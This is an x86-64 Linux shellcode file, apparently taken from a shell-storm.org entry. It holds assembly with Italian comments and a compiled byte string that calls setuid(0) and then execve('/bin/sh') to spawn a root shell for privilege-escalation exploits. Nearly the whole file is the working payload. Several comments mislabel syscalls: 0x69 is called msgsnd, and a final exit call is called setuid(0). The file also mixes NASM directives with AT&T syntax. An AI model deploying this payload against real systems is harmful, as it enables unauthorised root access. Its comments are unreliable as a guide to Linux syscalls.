; https://shell-storm.org/shellcode/files/shellcode-77.html
; setuid(0) + execve(/bin/sh) - just 4 fun. 
; xi4oyu [at] 80sec.com
section .text
        global _start

_start:
        xorq %rdi,%rdi                  ; elimina i caratteri non validi dal registro
        mov $0x69,%al                   ; preprare il registro per la systemcall 69 (msgsnd)
        syscall                         ;
        xorq   %rdx, %rdx               ; elimina i caratteri non validi per la shellcode dal registro 
        movq   $0x68732f6e69622fff,%rbx ; preparazione della syscall execve (argomenti)
        shr    $0x8, %rbx               ; 
        push   %rbx                     ; salva il valore del registro rbx nello stack 
        movq   %rsp,%rdi                ; 
        xorq   %rax,%rax                ; ...
        pushq  %rax                     ; ...
        pushq  %rdi                     ; ...
        movq   %rsp,%rsi                ; 
        mov    $0x3b,%al                ; carica il registro con il codice 59 (3b)
        syscall                         ; 
        pushq  $0x1                     ; systemcall setuid(0) 
        pop    %rdi                     ;
        pushq  $0x3c                    ;
        pop    %rax                     ;
        syscall                         ;


; compiled shellcode 
; \x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05